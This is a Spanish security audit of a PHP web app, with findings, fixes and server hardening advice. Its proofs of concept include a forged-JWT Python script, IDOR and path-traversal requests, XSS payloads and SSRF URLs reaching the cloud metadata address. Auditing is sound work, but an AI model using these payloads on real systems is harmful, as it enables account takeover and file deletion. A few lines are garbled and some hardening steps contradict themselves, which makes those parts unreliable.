# Informe de Auditoría de Seguridad — Cuaderno (Eber Framework)

**Fecha:** 2026-09-26
**Alcance:** `C:\Users\eber\Proyectos\Cuaderno` (App + `vendor/eber/framework`)
**Método:** revisión estática de código (sin exploited)
**Objetivo:** evaluar si la aplicación es apta para producción en Linux

---

## 0. Resumen ejecutivo

| Severidad | Cantidad | Estado |
|---|---|---|
| CRÍTICA | 2 | **Bloqueante de producción** |
| ALTA | 4 | Bloqueante |
| MEDIA | 8 | Requiere parche |
| BAJA / INFO | 8 | Recomendado |

**Veredicto: NO subir a producción todavía.** Hay dos vulnerabilidades que permiten
comprometer cuentas ajenas y el servidor, sin necesidad de autenticación previa en un caso
y con autenticación trivial en el otro.

Advertencia principal: la aplicación tiene **buena base** (query builder con PDO, `password_hash`,
`session_regenerate_id`, cookies `httponly`/`SameSite`, verificación HMAC con `hash_equals` en el
webhook, `.env` correctamente fuera de git). Los fallos son casi todos **de forgot de controles
en el borde**: un `extract()`, un `basename()` que falta, un flag CSRF apagado, y un header CORS
global. Son arreglos pequeños y quirúrgicos.

---

## 1. CRÍTICAS — bloqueantes

### C-1 · `extract()` sobre parámetros del usuario → IDOR cross-user
**Archivo:** `App/Models/DesignModels.php:371-386` (uso en `:1360`, `:1364`)

```php
371:  $userClean = mb_strtolower($user, "UTF-8");
382:  $dataRequest = $currentData["card"] ?? self::getDefaultCard($userClean);
384:  if (is_array($param)) {
385:    extract($param);              // ← CWE-621 EXTR_OVERWRITE
386:  }
...
1360: CacheModule::set("design_draft_" . $userClean, ["card" => $cardPayload], 86400 * 7);
1364: $saved = self::saveDesignToDb($userClean, 1, $cardPayload);
```

`$userClean` se define en la línea 371 y se vuelve a leer en 1360/1364 **después** del `extract()`.
Como `extract()` crea variables a partir de las claves del array, un atacante que envíe un
parámetro llamado `userClean` **sobrescribe la variable que decide en qué fila de la base de datos
se escribe**.

`DashboardMiddleware` sólo valida el usuario de la **URL** (`web.php:56`, `UserModels::canAccessDashboard`),
nunca el del **cuerpo** de la petición.

**Cadena de alcance:** `POST /panel/:user/diseno` (`App/Route/web.php:63`) → `DesignControllers::configDesign`
→ `DesignModels::updateCustomDesign`.

**PoC:**
```
POST /panel/attacker/diseno HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userClean=victim&profile=victim&title=pwned
```
Escribe un borrador controlado por el atacante en la fila de `victim`. Lo que se puede
sobrescribir: `$userClean`, `$dataRequest`, `$officialCard`, `$user`, `$currentData`, `$officialData`.

**Impacto:**omlite. Es el primer eslabón de la cadena C-1 + H-1 (XSS almacenada en el perfil de una
víctima) y H-2 (borrado de ficheros arbitrarios).

**Corrección:**
1. Eliminar `extract($param)` y leer los campos explícitamente (`$param['title'] ?? …`), tal como ya
   se hace correctamente en el bloque `$cardPayload` de las líneas 1323-1356. Es decir: el bug es que
   conviven dos estilos de acceso y el viejo quedó vivo.
2. Re-derivar `$userClean` del usuario de sesión, nunca del body.
3. Añadir a `AGENTS.md` como regla: **prohibido `extract()` sobre entrada del usuario** (usar
   `ViewData` del framework, que es el mecanismo correto).

---

### C-2 · Semilla HMAC débil y adivinable → falsificación de JWT de sesión
**Archivos:** `.env:3`, `vendor/eber/framework/Base/Module/TokenModule.php:209-216`

```php
// .env:3
SEED="esta_es_la_semilla_de_validacion"

// TokenModule.php:211
$seed = $_ENV['SEED'] ?? getenv('SEED') ?? (defined('SEED') ? SEED : '');
if (empty($seed)) {
    $seed = defined('NAME_SITE') ? md5(NAME_SITE) : 'fallback_secret_seed_phrase';
}
```

Ese `SEED` es la **clave HMAC-SHA256 de la sesión JWT**:

```php
// Session.php:136 → configJWT($data)  → TokenModule.php:156
$signature = hash_hmac('sha256', $encodedHeader . '.' . $encodedPayload, $secret, true);
// TokenModule.php:179 → validateJWT()  → hash_equals()   ✔ timing-safe
```

Y la cookie `auth_token` se restaura en sesión **sin consultar la base de datos**:

```php
// Session.php:78-89
private static function checkJwtSession(): void {
    if (empty($_SESSION['user']) && …) {
        $jwtToken = CookieModule::get('auth_token');
        if ($jwtToken) {
            $userData = TokenModule::validateJWT($jwtToken);
            if ($userData !== false && is_array($userData)) {
                $_SESSION['user'] = $userData;   // ← se usa tal cual
            }
        }
    }
}
```

El payload es `['iat'=>, 'exp'=>30 días, 'data'=> <fila del usuario completa>]`
(`Session.php:146-150`, duración en `App/Config/TokenConfiguration.php:66`).

**PoC:** el atacante lee el repositorio (es público: `llms.txt` y `sitemap.xml` anuncian
`https://github.com/eber110/Cuaderno`), conoce `SEED`, y forja en un script local:

```python
import hmac, hashlib, base64, json, time
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p = b64(json.dumps({"iat":int(time.time()),
                    "exp":int(time.time())+86400*10,
                    "data":{"user_id":1,"username":"eber","email":"…","user_status":"active"}},
                   separators=(',',':')).encode())
sig = b64(hmac.new(b"esta_es_la_semilla_de_validacion", h+b'.'+p, hashlib.sha256).digest())
print((h+b'.'+p+b'.'+sig).decode())
```

Poner ese valor en la cookie `auth_token` = **cuenta de cualquier usuario, sin contraseña**.
La misma clave firma los perfiles de token `emails` (verificación de correo) y `recovery`
(restablecimiento de contraseña, 15 min), así que **también permite resetear contraseñas ajenas**.

**Impacto:** toma de control total de la aplicación.

**Corrección:**
1. Generar un `SEED` aleatorio de 32 bytes: `openssl rand -hex 32` (o `bin2hex(random_bytes(32))`).
2. **Rotarlo invalida todas las sesiones y tokens emitidos** — es deseable; hazlo antes de producción.
3. Añadir guardia en `TokenModule::getSeed()` que **lance excepción** si el seed es vacío o
   más corto de 32 caracteres, en lugar de caer en `md5(NAME_SITE)`.
4. Añadir a `.env.example` un placeholder vacío y documentar que es obligatorio.
5. En producción, verificar `user_status` contra la BD al restaurar la sesión (ver M-4).

---

## 2. ALTAS

### A-1 · Borrado arbitrario de ficheros por path traversal
**Archivo:** `App/Models/DesignModels.php:1375-1384` (idéntico en `:1392-1400`)

```php
1375: public static function deleteAvatarFromDisk(string $avatarFilename): void {
1376:   if (empty($avatarFilename) || $avatarFilename === "no-user.webp"
1376:      || str_contains($avatarFilename, "Custom/") || str_contains($avatarFilename, "Origin/")) return;
1379:   $avatarDir = ROOT_PATH . "/Uploads/Avatar/";
1380:   $filePath  = $avatarDir . $avatarFilename;   // ← sin basename(), sin realpath()
1381:   if (file_exists($filePath) && is_file($filePath)) { @unlink($filePath); }
1382: }
```

Los únicos guardas son `str_contains` de `"Custom/"` y `"Origin/"`, que no bloquean `../`.
Y `$dataRequest["avatar"]` es controlable por el atacante vía `extract()` (C-1).
El mismo patrón vulnerable está en `vendor/eber/framework/Base/Module/ImgProcessModule.php:846-885`
(`delete_img_disk`).

**PoC:**
```
POST /panel/victim/diseno HTTP/1.1
Content-Type: multipart/form-data; boundary=--

--BOUNDARY
Content-Disposition: form-data; name="dataRequest[avatar]"

../../App/Config/config.php
--BOUNDARY
Content-Disposition: form-data; name="avatar"; filename="a.png"
Content-Type: image/png

<PNG válido>
--BOUNDARY--
```
La condición de la línea 399 exige además que haya un `avatar` subido correctamente y que el
valor sea distinto del avatar oficial — trivial de satisfacer.

**Corrección:**
```php
$avatarDir = realpath(ROOT_PATH . "/Uploads/Avatar/");
$filePath  = realpath($avatarDir . basename($avatarFilename));
if ($filePath !== false && str_starts_with($filePath, $avatarDir . DIRECTORY_SEPARATOR) && is_file($filePath)) {
    unlink($filePath);
}
```

---

### A-2 · XSS almacenada en los perfiles públicos
**Archivo:** `App/Views/User/Button/Regular/buttonRegular.php`

```php
21: <div data-content-index="<?= $dataContent ?>" class="… <?= $card["borders"][0]?> <?= $card["shadow"]?>"…>
23:   <a href="<?= $card["content"][$dataContent]["url"] ?? '#' ?>" target="_blank" …>
27:     <img src="<?= $imgSrc ?>" alt="" …>
34:   <p …><?= $content;?></p>
```

Ni `e()`, ni `htmlspecialchars`, en ninguno de los cuatro. El contenido se guarda **crudo**
(`DesignModels.php:1355` → `json_encode` en `saveDesignToDb:156`) y se sirve en `/<usuario>`
(`web.php:120`), una página **pública**.

Detalle relevante: el **borrador se sirve sin publicar**. `DesignModels::dataUser` (`:182-190`)
consulta `getCustomDesign` **antes** que `getOfficialDesign`, así que el atacante no necesita
publicar nada — basta con guardar.

**PoC:** como título de botón, `"><img src=x onerror=alert(document.cookie)>`.
Como URL, `javascript:alert(1)`.

**Corrección:** envolver todo en `e()`. Para `href`/`src` permitir sólo `http(s)`:
```php
function eUrl($u): string {
  $u = trim((string)$u);
  if (!preg_match('#^https?://#i', $u)) return '#';
  return e($u);
}
```

**Barrido completo:** 371 salidas `<?= $` sin escapar en `App/Views` + `App/Segment`.
Reparto: `contentButtonPanel.php` (194), `style.css.php` (21), `backgroundPanel.php` (14),
`colorPanel.php` (13), `productGroup.php` (12), `sideMenu.php` (11), `campaign.php` (9),
`sideMenuPhone.php` (9), `buttonPanel.php` (8), `contentRRSSPanel.php` (7), `productRegular.php` (5),
`separator.php` (5), `index.php` (5), `headerPanel.php` (5), `buttonRegular.php` (4), …

`style.css.php:22-30` merece atención aparte: interpola colores **dentro de un bloque `<style>`**,
donde `htmlspecialchars` no basta — un payload como `}</style><script>…` escapa del contexto. Ahí
hace falta **allowlist strict de colores** (`^#[0-9a-fA-F]{3,8}$`), no escaping.

Los archivos del panel (`contentButtonPanel.php`, etc.) sólo los ve el dueño, así que ahí el
impacto es self-XSS — pero sigue siendo un vector: combinado con C-1, un atacante puede inyectar
XSS en el panel de la víctima.

---

### A-3 · SSRF sin autenticar en el proxy global de imágenes
**Archivos:** `App/Route/web.php:100-116`, `vendor/eber/framework/Base/Module/ProxyModule.php:33-54`

```php
// web.php:100 — sin middleware, público
Route::get("/proxy", function() {
    if (preg_match('/[?&]url=(.*)$/', $requestUri, $matches)) $url = urldecode($matches[1]);
    ProxyModule::proxyImage($url, ['licdn.com','linkedin.com','githubusercontent.com','ebersanchez.cl']);
});

// ProxyModule.php:37
if (str_ends_with($host, strtolower($domain))) { $allowed = true; break; }
```

Cuatro fallos combinados:
1. `str_ends_with` **no exige límite de punto**: `notlinkedin.com`, `evilgithubusercontent.com`
   pasan el filtro.
2. `CURLOPT_FOLLOWLOCATION = true` con `MAXREDIRS 3` (línea 50-51): el destino del redirect **no se
   re-valida** → bypass trivial vía 302, y permite alcanzar `169.254.169.254`.
3. **No hay filtro de rangos privados** (127.0.0.1, 10/8, 172.16/12, 192.168/16, `::1`).
4. `CURLOPT_SSL_VERIFYPEER/VERIFYHOST = false` (líneas 53-54) → MITM y pooling de conexiones inseguro.

**PoC:**
```
GET /proxy?url=https://notlinkedin.com/latest.png
```
Si ese dominio resuelve a `169.254.169.254` (o redirige allí), el servidor devuelve el cuerpo:
credenciales de la instancia cloud, servicios internos, `localhost`. También sirve como
proxy abierto y redireccionador para herramientas de rastreo y para Hide 'n' Seek.

**Corrección:**
```php
$host = strtolower(parse_url($url, PHP_URL_HOST) ?? '');
$allowed = false;
foreach ($allowedDomains as $d) {
    $d = strtolower($d);
    if ($host === $d || str_ends_with($host, '.' . $d)) { $allowed = true; break; }
}
```
Más: `CURLOPT_FOLLOWLOCATION => false`, `SSL_VERIFYPEER => true`, allowlist de `Content-Type`
(`image/*`), y resolver la IP para rechazar rangos privados antes de cada salto.

El mismo SSRF con `FOLLOWLOCATION` y TLS desactivado está en
`Base/Module/RequestMetaModule.php:24-33`, alcanzable desde `DesignModels.php:1723` con la URL del
perfil del usuario (**autenticado**). Y en `App/Services/CloudinaryService.php:205` y
`App/Providers/LemonSqueezyProvider.php:95` (éste último con la API key de Lemon Squeezy en la
petición → Riesgo: MITM puede capturar credenciales de la pasarela de pago).

---

### A-4 · La protección CSRF está generada pero nunca aplicada
**Archivos:** `.env:82`, `SecurityModule.php:263`, `App/Segment/Form/login.php:6,9`

```php
// .env:82  ← vacío = desactivado
CSRF_PROTECTION=""
// .env.example:49
CSRF_PROTECTION="true"
```

Existen `SecurityModule::getCsrfToken()` (`:199`), `validateCsrfToken()` (`:217`), `csrfField()` (`:245`)
y `verifyCsrf()` (`:263`). Los formularios de login y registro **emiten** el campo oculto. Pero un
grep exhaustivo sobre todo `App/` y el framework devuelve **cero llamadas** a `validateCsrf` /
`verifyCsrf` — sólo las definiciones.

**Medición:** 15 formularios `method="post"`, 2 ocurrencias de `csrf_token`, **0 verificaciones
efectivas**. Ningún endpoint POST está protegido.

`SameSite=Lax` (`Session.php:57`) mitiga sólo parcialmente: los POST cruzados sí se bloquean, pero
**no** los GET con cambio de estado. Y `GET /salir` (`web.php:97`) es exactamente eso: un
`<img src="https://tu-dominio/salir">` en cualquier foro cierra la sesión de la víctima.

**Corrección:** aplicar en todos los controladores POST, o preferiblemente **en el middleware/Front
controller** para que sea imposible olvidarlo:
```php
// En el punto de entrada, antes de despachar
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !SecurityModule::verifyCsrf()) {
    ResponseModule::error("Token CSRF inválido", 403);
}
```
Y convertir `/salir` en POST + token.

---

## 3. MEDIAS

| # | Hallazgo | Ubicación | Nota |
|---|---|---|---|
| **M-1** | Endpoints operativos sin autenticar | `web.php:47-52, 123-146` | `GET /lemon-squeezy/init-db` ejecuta DDL (`CREATE TABLE`) a petición, sin auth ni rate limit. `GET /op/check` filtra `PHP_VERSION` y `php_ini_loaded_file()`. `GET /op/image` reescribe **todas** las imágenes de `App/Public/Img/Custom/` en cada llamada → DoS de CPU/disco. Los tres están **publicados en `sitemap.xml`** (`web.php:17`), lo que facilita el descubrimiento. |
| **M-2** | El subsistema de seguridad nunca arranca | `providers.json`, `Bootstrap/App.php:8-21` | `providers.json` es `{"providers": []}`. Por tanto `AccessBlocker::checkAndBlockRequest()` y `AntiScraper` son **código muerto**: no hay bloqueo de IP ni registro de intrusiones en ninguna ruta. La protección anti-bot del `.htaccess` está comentada (líneas 44-46). |
| **M-3** | `.env`, `Cache/`, `Logs/`, `.git/` y listados de directorio servibles | `.htaccess:39, 59-66` | Sólo hay `Options -MultiViews`. Las reescrituras sirven **directamente** los ficheros existentes. `/.env` filtraría `LEMON_SQUEEZY_API_KEY`, `CLOUDINARY_API_SECRET`, `SEED`, `LEMON_SQUEEZY_WEBHOOK_SECRET`. `Cache/*.cache` contiene `unserialize()` (ver M-5). |
| **M-4** | La sesión JWT no se revalida ni se puede revocar | `Session.php:78-89` | Se restaura la fila de usuario **sin consultar la BD** y sin comprobar `user_status`, durante 30 días. Una cuenta borrada, suspendida o degradada de rol conserva acceso total hasta que expire el token. |
| **M-5** | `unserialize()` sin `allowed_classes` sobre ficheros en el webroot | `Base/Module/CacheModule.php:184, 346` | `@unserialize(file_get_contents($filename))`, con nombres `md5($key).cache` dentro de `Cache/` — que además es legible por web (M-3). No encontré una escritura serializada controlada por el atacante, así que es defensa en profundidad: usar `['allowed_classes' => false]` o migrar a JSON. |
| **M-6** | Rate limit keyed sólo por `REMOTE_ADDR` | `Base/Builder/Builder.php:138, 180` | Detrás de Cloudflare (implícito: `index.php:12` confía en `X-Forwarded-Proto`) **todos los usuarios comparten la IP del borde**: 5 fallos de cualquiera bloquean a todos durante 60 s. Y al ser por `(IP, usuario)`, no hay tope agregado por IP → fuerza bruta distribuida sin límite. |
| **M-7** | CORS `*` y `Cache-Control: public` forzados en todas las respuestas | `.htaccess:30-37` | Se aplica **incondicionalmente**, incluidos el JSON autenticado de `/panel/:user/estadisticas` y `/diseno`. Anula la decisión de la app: `CorsConfiguration.php:64` tiene `'enabled' => false`. Un CDN o caché compartido honoring `public` puede servir el panel privado de un usuario a otro. |
| **M-8** | Fuga de mensajes de excepción al usuario | `LoginControllers.php:268` | `ResponseModule::redirect("/registrar", "Error en el registro: " . $e->getMessage(), 2)`. Un `PDOException` filtra nombres de tabla, columnas y fragmentos de SQL. Mostrar un mensaje genérico y registrar el detalle en `Logs/`. |

---

## 4. BAJAS / INFORMATIVAS

- **B-1 · Enumeración de usuarios** — `LoginControllers.php:62-65` distingue "usuario no válido" de
  "contraseña no válida"; `/registrar/check-username` y `/check-email` confirman existencia de
  cualquier usuario/correo sin autenticación. Usar un mensaje genérico único.
- **B-2 · IP de cliente falsificable en analítica** — `VisitModels.php:27-39` confía
  `HTTP_CF_CONNECTING_IP`, `X-Forwarded-For`, `X-Real-IP`, `HTTP_CLIENT_IP` sin lista de proxies de
  confianza. Cualquiera puede falsear la IP/geo registrada. (El rate limit sí usa `REMOTE_ADDR`, así
  que no le afecta.)
- **B-3 · Checkout acepta `variant_id` y `redirect_url` arbitrarios** —
  `LemonSqueezyControllers.php:46`. `redirect_url` sólo se valida como HTTPS, cualquier host.
  Allowlist de variantes y de rutas propias.
- **B-4 · La firma del webhook se sanitiza antes de verificar** —
  `LemonSqueezyControllers.php:232` aplica `htmlspecialchars` a la firma. Inofensivo hoy (son
  hexadecimales) pero conceptualmente incorrecto; pasar el valor crudo.
- **B-5 · Rutas de test en producción** — `App/Route/test.php` con `var_dump`, `TestMiddleware`
  (que además tiene lógica invertida: `if (!session_active() && empty($user))` — un usuario
  deslogueado con el campo `username` vacío pasa). Eliminar el archivo del despliegue.
- **B-6 · TLS desactivado en 4 clientes HTTP** — `ProxyModule.php:53-54`,
  `RequestMetaModule.php:32-33`, `CloudinaryService.php:205`, `LemonSqueezyProvider.php:95`.
- **B-7 · `index.php` confía en `X-Forwarded-Proto`** sin validar proxy (`:10-13`) — sólo permite
  degradar el 301 a `http://` o forzar `secure` (más seguro). Restringir a proxies conocidos.
- **B-8 · Enumeración de technology stack** — `Access-Control-Allow-Origin: *` +
  `php_ini_loaded_file()` + versión de PHP exponen la pila tecnológica. Eliminar M-1 y M-7.

---

## 5. Lo que YA está bien (no tocar)

Verificado durante la auditoría, para no romper lo correcto al parchear:

- **SQL injection** — `Builder`/`BuilderSqlite` parametrizan con PDO; los únicos identificadores
  interpolados son `$this->table` y `$this->join`, que siempre son **literales hardcodeados** en
  `App/Models/`. `ALLOWED_TABLES` es opt-in por constante, así que el
  `SecurityModule::addAllowedTable()` de `App/Config/config.php:69-72` es inocuo.
- **Contraseñas** — `password_hash($pass, PASSWORD_DEFAULT)` (`LoginControllers.php:251`) y
  `password_verify()` primero (`Builder.php:1501`).
- **Fijación de sesión** — `session_regenerate_id(true)` en login (`Session.php:116`).
- **Cookie de sesión** — `use_strict_mode`, `use_only_cookies`, `httponly`, `SameSite=Lax` (`Session.php:44-58`).
- **HMAC del webhook** — `hash_hmac` + `hash_equals()` (`LemonSqueezyProvider.php:287-288`): correcto
  y timing-safe.
- **Subida de ficheros** — nombre generado por el servidor (`bin2hex(random_bytes(16))`) y
  **re-codificación completa** con GD/Imagick (`:720-727`), lo que neutraliza una webshell aunque
  se subiera. (El check de MIME sí usa `$_FILES['type']` del cliente, pero la re-codificación compensa.)
- **LFI vía helpers de vista** — `resolvePath` mapea `.`→`/` y todos los nombres de vista son
  literales; no hay nombre de vista controlable por el usuario.
- **Escape en SEO** — `setOpenGraph`/`setMetaDescription` sí usan `htmlspecialchars` + `strip_tags`.
- **Errores** — `ENVIRONMENT=production` y `ErrorHandler::handle500` oculta detalles + escapa.

> Excepción: `Base/Control/Control.php:161` hace
> `echo '<title>' . SeoModule::title() . '</title>` **sin escapar**, y
> `SeoModule::title()` (`:123-132`) sólo aplica `ucwords()`. Como
> `UserControllers.php:78` llama `setTitle("Clikhub - " . $card["title"])` con el título del
> perfil controlado por el usuario → **XSS almacenada vía `</title><script>…</script>`** en todas
> las páginas de perfil. Es parte de A-2. Arreglo: `htmlspecialchars(SeoModule::title(), ENT_QUOTES, 'UTF-8')`.

---

## 6. Plan de corrección — orden de ejecución

### Fase 0 — Antes de tocar nada (30 min)
- [ ] **Despliega a un servidor de pruebas, no a producción.** Verifica que el dominio público
      (`llms.txt` + `sitemap.xml` anuncian el repo) no está ya indexado.
- [ ] Guarda copia de `App/Models/DesignModels.php`, `TokenModule.php` y `Session.php`.
- [ ] Genera el nuevo `SEED`: `openssl rand -hex 32` → `.env`.

### Fase 1 — Críticos (bloqueante, ~2 h)
1. **C-2** — nuevo `SEED` aleatorio + guardia que lance excepción si es corto/ausente.
   *Efecto colateral deseado: cierra todas las sesiones y tokens antiguos.*
2. **C-1** — eliminar `extract($param)` en `DesignModels.php:385`; leer campos de `$param`
   explícitamente; derivar `$userClean` de la sesión.
3. **A-1** — `basename()` + `realpath()` + `str_starts_with()` en `deleteAvatarFromDisk()`,
   `deleteContentImageFromDisk()` y `ImgProcessModule::delete_img_disk()`.
4. **A-4** — `CSRF_PROTECTION="true"` en `.env` + verificación obligatoria en el front controller
   para todo POST; migrar `/salir` a POST.

### Fase 2 — Altos (~3 h)
5. **A-2** — barrido de escaping en las 371 salidas. Empieza por las públicas
   (`App/Views/User/**`, `App/Segment/Template/UserPreview/`), luego el panel.
   En `style.css.php` usa allowlist de colores, no escaping.
   Arregla también `Control.php:161`.
6. **A-3** — límite de punto en la allowlist, `FOLLOWLOCATION=false`, TLS verificado, filtro de IPs
   privadas, allowlist de `Content-Type`; añadir auth o rate limit a `/proxy`.

### Fase 3 — Medias (~2 h)
7. **M-1** — borrar `GET /op/check`; proteger o borrar `/op/image` e `/init-db`; sacarlos del sitemap.
8. **M-3** — endurecer `.htaccess` (ver §7.2).
9. **M-7** — borrar `Header append Cache-Control "public"` y `Access-Control-Allow-Origin: *`.
10. **M-2** — escribir un `SecurityProvider` y registrarlo en `providers.json` para activar
    `AccessBlocker` + `AntiScraper`.
11. **M-4** — revalidar `user_status` al restaurar la sesión JWT; usar la sesión PHP para
    persistencia a largo plazo y dejar el JWT como token de acceso corto.
12. **M-6** — resolver la IP real tras una allowlist de proxies; añadir tope agregado por IP.
13. **M-8** — mensaje genérico + log. **M-5** — `allowed_classes => false`.

### Fase 4 — Preventivo
14. Añadir a `AGENTS.md` tres reglas nuevas: **prohibido `extract()` sobre input**, **obligatorio
    `e()` en toda salida**, **todo cambio de estado por POST + CSRF**.
15. Añadir un escáner de dependencias y un chequeo de secretos (`gitleaks`) al CI.

---

## 7. Endurecimiento del servidor Linux (producción)

> Nota: tu entorno local es **WampServer sobre Windows 11**, pero producción es **Linux**.
> Los controles de abajo asumen Apache + `mod_php` o Nginx + PHP-FPM. **Apache en Windows no es
> un mirror fiel**: `.htaccess` se aplica igual, pero los permisos POSIX (7.1) no existen. Verifica
> cada punto contra tu configuración real de producción.

### 7.1 Lo que cambia respecto a local
| Aspecto | Local (Wamp/Windows) | Producción (Linux) |
|---|---|---|
| Propietario de ficheros | Administrator | `www-data` |
| Permisos | Heredados | `750` dirs / `640` ficheros |
| `display_errors` | On para depurar | **Off** |
| `open_basedir` | Innecesario | **Activar** |
| TLS | Innecesario | Obligatorio (HSTS) |

### 7.2 `.htaccess` — bloque de protección
```apache
Options -Indexes -MultiViews
DirectoryIndex index.php

# 7.2.1 Ficheros sensibles: denegar acceso directo
<FilesMatch "^(\.env|\.env\..*|\.git.*|composer\.(json|lock)|\.htaccess|.*\.sql|.*\.sqlite|.*\.log|.*\.cache)$">
  Require all denied
</FilesMatch>

# 7.2.2 Directorios internos
<DirectoryMatch "^.*/(Cache|Logs|Database|\.git|vendor/composer)(/|$)">
  Require all denied
</DirectoryMatch>

# 7.2.3 Nunca ejecutar PHP en carpetas de subidas
<DirectoryMatch ".*/(Uploads|App/Public)/(.*)">
  php_flag engine off
  <FilesMatch "\.(php|phtml|phar|cgi|pl|py|sh)$">
    Require all denied
  </FilesMatch>
</DirectoryMatch>

# 7.2.4 Cabeceras de seguridad (añadir; hoy faltan todas)
<IfModule mod_headers.c>
  Header always set X-Content-Type-Options "nosniff"
  Header always set X-Frame-Options "SAMEORIGIN"
  Header always set Referrer-Policy "strict-origin-when-cross-origin"
  Header always set Permissions-Policy "geolocation=(), camera=(), microphone=()"
  Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"   # sólo con HTTPS
</IfModule>
```
> `X-Frame-Options: SAMEORIGIN` es relevante: hoy tu panel se puede **enmarcar** (clickjacking),
> lo que facilita el CSRF de A-4.
>
> **`php_flag` no funciona con PHP-FPM** (módulo `mod_php` únicamente). Si usas Nginx+FPM,
> cumple el equivalente con `location ~ ^/(Uploads|App/Public)/.*\.(php|phtml|phar)$ { deny all; }`
> en el server block, y comprueba además que `cgi.fix_pathinfo=0` y `security.limit_extensions`
> en el pool de PHP.

### 7.3 `php.ini` de producción
```ini
expose_php = Off
display_errors = Off
log_errors = On
error_log = /var/log/php/cuaderno-error.log

; Impide ejecutar PHP en subdirectorios de ficheros subidos
cgi.fix_pathinfo = 0
security.limit_extensions = .php .phtml .phar

; Endurece el opener y el include_path
allow_url_include = Off
allow_url_fopen = On          ; requerido por GeoIP/MaxMind; si no, ponlo a Off

; Sesiones: almacenamiento fuera del webroot y permisos correctos
session.save_path = "/var/lib/php/sessions"
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Lax"
session.use_strict_mode = 1
session.sid_length = 48
session.sid_bits_per_character = 6
session.gc_maxlifetime = 3600
session.sid_length = 48

; Cargas
open_basedir = /var/www/cuaderno:/tmp:/usr/share/php

; Registro
file_uploads = On
upload_max_filesize = 8M       ; .htaccess pide 64M: ajústalo aquí, no sólo en .htaccess
post_max_size = 10M
max_execution_time = 30         ; el cron de visitas, no la web
memory_limit = 128M
```

### 7.4 Nginx: lo que la `.htaccess` **no** protege
Si usas Nginx, `.htaccess` se ignora por completo. Replica las mismas reglas:
```nginx
# 1. Nunca servir ficheros ocultos ni el webroot interno
location ~ /\. { deny all; }
location ~* ^/(Cache|Logs|Database|vendor/composer)/ { deny all; }
location ~* ^/(Uploads|App/Public)/.*\.(php|phtml|phar)$ { deny all; }

# 2. Front controller único
location / { try_files $uri $uri/ /index.php?$query_string; }

# 3. Proteger el panel de clickjacking/CSRF visual
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;

# 4. Nunca cachear respuestas autenticadas
proxy_no_cache 1;
proxy_cache_bypass 1;
```

### 7.5 Firewall y servicios
```bash
# 1. Uploads y Cache fuera del webroot
chown -R www-data:www-data /var/www/cuaderno/Uploads /var/www/cuaderno/Cache
chmod 750 /var/www/cuaderno/Uploads /var/www/cuaderno/Cache
find /var/www/cuaderno -type f -exec chmod 640 {} \;
find /var/www/cuaderno -type d -exec chmod 750 {} \;

# 2. SQLite y mmdb: no deben ser legibles por el usuario de servicio
chmod 640 /var/www/cuaderno/Database/*.sqlite /var/www/cuaderno/Database/*.mmdb
chown root:www-data /var/www/cuaderno/Database/*.sqlite

# 3. MariaDB/MySQL: sólo localhost, bind-address
bind-address = 127.0.0.1

# 4. Logs: no mezclarlos con el webroot
ln -sfn /var/log/nginx /var/www/cuaderno/Logs   # o mejor: cambia ROOT_PATH del log
```

### 7.6 Lista de verificación pre-lanzamiento
- [ ] `curl -sI https://dominio/.env` → **404/403**, nunca 200 con contenido
- [ ] `curl -sI https://dominio/op/check` → 404/403 (ya borrado)
- [ ] `curl -sI https://dominio/Cache/` → 403, sin listado
- [ ] `curl -s https://dominio/robots.txt` → no expone rutas internas
- [ ] Fuga de claves en `sitemap.xml` / `llms.txt` → nada que no deba ser público
- [ ] Un usuario **sin sesión** que llame a `POST /panel/x/diseno` → 302 a `/ingresar`
- [ ] Formulario sin `csrf_token` en el DOM → ninguno
- [ ] `<title>` y `og:title` con `<script>` como título → escapado
- [ ] `php -l` sin errores en todos los ficheros modificados
- [ ] `composer min-script` ejecutado tras los cambios de assets
- [ ] `composer audit` sin vulnerabilidades conocidas
- [ ] Copia de seguridad de `Database/` + `Uploads/` verificada **y restaurada** al menos una vez

---

## 8. Prueba de concepto de los dos críticos

> Ejecutar **sólo** en un entorno de pruebas local. Requieren una cuenta de atacante legítima
> (registro es abierto) salvo C-2, que no requiere ninguna.

### PoC C-1 — IDOR cross-user
```bash
# 1. Regístrate como atacante y obtén tu cookie de sesión
curl -c attacker.txt -d "username=attacker&email=a@t.com&pass=Password1&repass=Password1" \
     -X POST http://localhost/registrar
curl -b attacker.txt -c attacker.txt -d "username=attacker&pass=Password1" \
     -X POST http://localhost/ingresar

# 2. Escribir en el diseño de OTRO usuario (requiere que ese usuario exista)
curl -b attacker.txt -X POST http://localhost/panel/attacker/diseno \
     -d "userClean=victima&title=PWNED&desc=inyectado"

# 3. Verificar: el perfil público /victima ahora muestra "PWNED"
curl -s http://localhost/victima | grep -o "PWNED"
```

### PoC C-2 — Falsificación de JWT (sin contraseña)
```bash
# Forjar el token fuera de línea (el secreto está en el repo / es adivinable)
python3 - <<'PY' > forged.txt
import hmac,hashlib,base64,json,time
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p=b(json.dumps({"iat":int(time.time()),"exp":int(time.time())+86400,
  "data":{"user_id":1,"username":"eber","email":"x@y.z","user_status":"active"}},
  separators=(',',':')).encode())
s=b(hmac.new(b"esta_es_la_semilla_de_validacion",h+b'.'+p,hashlib.sha256).digest())
print((h+b'.'+p+b'.'+s).decode())
PY

# Usarlo como cookie de sesión: entra al panel sin contraseña
curl -s -H "Cookie: auth_token=$(cat forged.txt)" http://localhost/panel/eber | head -20
```

---

## 9. Resumen de prioridades

| Orden | ID | Hallazgo | Esfuerzo |
|---|---|---|---|
| 1 | **C-2** | `SEED` débil → falsificar cualquier sesión/JWT | 15 min |
| 2 | **C-1** | `extract()` → escribir en el diseño de otro usuario | 45 min |
| 3 | **A-1** | Path traversal → borrar ficheros del servidor | 30 min |
| 4 | **A-4** | CSRF nunca verificado | 45 min |
| 5 | **A-2** | 371 salidas sin escapar (XSS almacenada) | 3 h |
| 6 | **A-3** | SSRF abierto + TLS desactivado | 1 h |
